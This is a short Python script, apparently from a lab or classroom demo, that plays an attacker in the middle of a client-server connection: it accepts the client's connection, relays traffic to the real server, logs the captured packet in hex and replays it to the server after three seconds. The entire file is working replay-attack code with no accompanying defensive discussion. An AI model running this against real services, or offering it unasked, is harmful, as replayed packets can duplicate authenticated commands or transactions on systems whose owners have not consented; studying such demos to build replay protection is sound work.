# attacker_vulnerable.py
import socket, sys, time

# Usage: python attacker_vulnerable.py <listen_port> <server_host> <server_port>
# Example: python attacker_vulnerable.py 4000 localhost 5000
client_port = int(sys.argv[1])
server_host = sys.argv[2]
server_port = int(sys.argv[3])

# Listen for client
listen = socket.socket()
listen.bind(('0.0.0.0', client_port))
listen.listen(1)
print(f"[Attacker] Listening on port {client_port} (client->server) ...")
client_sock, addr = listen.accept()
print(f"[Attacker] Client connected from {addr}")

# Connect to real server
server_sock = socket.socket()
server_sock.connect((server_host, server_port))
print(f"[Attacker] Connected to real server {server_host}:{server_port}")

# Forward first message from client to server
data = client_sock.recv(4096)
if not data:
    print("[Attacker] No data received from client.")
    client_sock.close()
    server_sock.close()
    sys.exit(0)
print("[Attacker] Captured packet from client:", data.hex())
server_sock.sendall(data)
print("[Attacker] Forwarded packet to server.")

# Optionally forward server's reply back to client
try:
    reply = server_sock.recv(4096)
    if reply:
        client_sock.sendall(reply)
        print("[Attacker] Forwarded server reply back to client.")
except socket.timeout:
    pass

# Wait a moment, then replay the captured packet
time.sleep(3)
print("[Attacker] Replaying the captured packet to server...")
server_sock.sendall(data)

# Relay server's second reply (if any)
try:
    reply2 = server_sock.recv(4096)
    if reply2:
        client_sock.sendall(reply2)
        print("[Attacker] Forwarded server reply to replayed packet.")
except socket.timeout:
    pass

client_sock.close()
server_sock.close()
listen.close()
print("[Attacker] Done.")
